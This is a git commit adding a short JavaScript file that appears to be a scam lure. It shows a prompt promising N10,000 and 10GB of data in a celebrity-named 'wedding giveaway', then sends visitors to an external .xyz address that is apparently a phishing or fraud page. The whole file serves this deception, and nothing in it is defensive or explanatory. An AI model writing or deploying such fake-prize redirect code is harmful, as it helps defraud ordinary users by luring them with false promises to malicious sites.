ed49101bb604d297280e9dbfb92567a6709228a7
okpoz <okpoitidz@gmail.com>
2026-07-29 00:20:29 +0100

    Create act-jarvispeller-giveaway.js

---
+++ act-jarvispeller-giveaway.js
@@ -0,0 +1,5 @@
+var password = 'CLAIM NOW'
+password=prompt('PELLERJARVIS: CHECK IF YOU ARE ELIGIBLE TO RECEIVE N10,000 AND 10GB DATA FROM BURNABOY ,JarvisPeller Wedding Giveaway, press Claim Now ','CLAIM NOW');
+if (password != 'CLAIM NOW') {
+location.href='https://mmaino.xyz/aksbursary';
+}
